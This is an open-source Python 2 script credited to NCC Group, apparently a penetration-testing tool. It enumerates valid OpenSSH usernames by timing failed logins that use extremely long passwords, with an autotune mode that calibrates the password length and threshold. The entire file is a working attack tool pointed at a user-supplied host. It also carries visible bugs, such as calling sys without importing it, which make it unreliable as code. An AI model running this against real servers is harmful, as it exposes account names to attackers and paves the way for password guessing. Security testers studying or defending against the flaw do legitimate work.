#!/usr/bin/python

#Released as open source by NCC Group Plc - http://www.nccgroup.com/

#OpenSSH Username enumeration
#Developed by David Cash <David.Cash@nccgroup.com>
#https://github.com/nccgroup/ssh_user_enum

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU Affero General Public License as
#published by the Free Software Foundation, either version 3 of the
#License, or (at your option) any later version.

#You should have received a copy of the GNU Affero General Public License
#along with this program (in the LICENSE file).  If not, see
#<http://www.gnu.org/licenses/>.


import paramiko
import time
from optparse import OptionParser


def enumattempt(user,host, port,threshold):
	username = user
	hostname = host
	password = 'A'*multiplier
	port = port

	#Start time
	starttime = time.mktime(time.gmtime())

	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(hostname,username=username ,password=password, port=port)

	except paramiko.BadAuthenticationType, e:
		print e
		sys.exit(1)

	except paramiko.SSHException:
		#Finish time
		finishtime = time.mktime(time.gmtime())
		timetaken= finishtime - starttime
		print "User " + username + " took " + str(timetaken) + " seconds"
		if timetaken >= threshold:
			print 'User ' + username + ' exists'
			return username
		else:
			return


def autotune(host, port, username):
	print "Autotuning......"
	multiplier = 1000
	hostname = host
	port = port
	autotuneusers = [username,'thisuserwillneverexistaaaaaa','thisuserwillalsoneverexistbbbb', 'thiswillalsoneverexistccccc']
	tuned = "False"
	while (multiplier < 500000):
		autotunetime = []
		password = "A"*multiplier
		print "Trying multiplier of: " + str(multiplier)
		for username in autotuneusers:
			#Start time
				starttime = time.mktime(time.gmtime())

				try:
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					ssh.connect(hostname,username=username ,password=password, port=port)

				except paramiko.BadAuthenticationType, e:
					print e
					sys.exit(1)

				except paramiko.SSHException:
					#Finish time
					finishtime = time.mktime(time.gmtime())
					timetaken= finishtime - starttime
					autotunetime.append(timetaken)
				if len(autotunetime) == 4:
					minlength = autotunetime[1] + autotunetime[2] + autotunetime[3]
					validlength = autotunetime[0]
					if validlength <= minlength:
						print "Need to increase multiplier"
						multiplier = multiplier + 1000
					else:
						return multiplier, validlength




#OPTIONS#########################
parser = OptionParser()
parser.add_option("-u", "--userlist", dest="userlist")
parser.add_option("-i", "--ip", dest="hostname")
parser.add_option("-m", "--multiplier", dest="multiplier", type="int")
parser.add_option("-t", "--threshold", dest="threshold")
parser.add_option("-p", "--port", dest="port", type = "int")
parser.add_option("-a", "--autotune", dest="autotune")

(options, args) = parser.parse_args()

if options.userlist:
	userfile = options.userlist
else:
	userfile = "none"

if options.hostname:
	hostname = options.hostname
else:
	print "Usage: sshenum.py -u <path to user file> -i <IP address> -a Autotune -m multiplier (optional - defaults to 20000) -t threshold -p <port> (default 22)"

if options.multiplier:
	multiplier = int(options.multiplier)
else:
	multiplier = 20000

if options.port:
	port = int(options.port)
else:
	port = 22

if options.autotune:
	autotuneuser = options.autotune
	autotune = autotune(hostname,port,autotuneuser)
	multiplier = autotune[0]
	threshold = autotune[1] - 2

	print "Multiplier tuned at: " + str(multiplier)
	print "Time threshold set at: " + str(threshold)


else:
	if options.threshold:
		threshold = int(options.threshold)
	else:
		threshold = 14
################################


validnames = []
usernames = open(userfile).read().splitlines()

print "\nStarting username enumeration\n===================="

for user in usernames:
	validnames.append(enumattempt(user,hostname,port,threshold))


validnames = [i for i in validnames if i is not None]
print "\n\nThe following users were valid (settings were - multiplier of " + str(multiplier) + " and a threshold of " + str(threshold) + ":\n==========================="
print "\n".join(validnames)
